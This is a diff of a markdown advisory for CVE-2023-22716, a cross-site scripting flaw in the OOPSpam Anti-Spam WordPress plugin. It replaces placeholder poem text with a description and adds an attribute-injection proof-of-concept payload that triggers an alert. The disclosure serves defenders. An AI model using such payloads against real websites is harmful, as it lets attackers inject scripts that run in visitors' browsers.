@@ -5,27 +5,20 @@ title: CVE-2023-22716 - OOPSpam Anti-Spam Plugin <= 1.1.35 - Cross Site Scriptin
 
 Description
 ============
-Home they brought her warrior dead:  
-She nor swooned, nor uttered cry:  
-All her maidens, watching, said,  
-'She must weep or she will die.'
+OOPSpam Anti-Spam Plugin <= 1.1.35 This could allow a malicious actor to inject malicious scripts, such as redirects, advertisements, and other HTML payloads into your website which will be executed when guests visit your site.
 
 Proof Of Concept
 ============
-Then they praised him, soft and low,  
-Called him worthy to be loved,  
-Truest friend and noblest foe;  
-Yet she neither spoke nor moved.  
+Payload
+
 ~~~
-define foobar() {
-    print "Welcome to flavor country!";
-}
+" onfocus=alert(/XSS/) autofocus="
 ~~~
 
 References
 ============ 
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22716
 
 
 
-
-[by Rio Darmawan](https://patchstack.com/database/researcher/0f0ce3de-fbab-4348-9729-a5ef92c74b3e)
+[Rio Darmawan](https://patchstack.com/database/researcher/0f0ce3de-fbab-4348-9729-a5ef92c74b3e)
